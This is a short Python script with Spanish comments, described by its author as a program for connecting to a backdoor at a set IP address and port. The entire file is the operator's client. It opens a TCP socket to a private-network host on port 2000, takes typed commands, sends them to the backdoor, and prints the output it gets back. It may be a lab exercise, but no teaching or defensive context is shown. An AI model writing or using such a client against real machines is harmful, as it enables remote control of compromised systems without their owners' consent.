# Enrique Adrian Gonzalez Martinez
# programa que ingresa a una backdoor con la ip y puerto indicado
# 24/10/2020  2:26 p.m.
import socket

direccion = ('192.168.100.13', 2000)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cliente:
    cliente.connect(direccion)
    while True:
        comando = input("Comando: ")
        if comando == "exit":
            break
        cliente.sendto(comando.encode("utf-8"), direccion)
        respuesta = cliente.recvfrom(2048)
        print("Respuesta:",respuesta[0].decode("utf-8"))
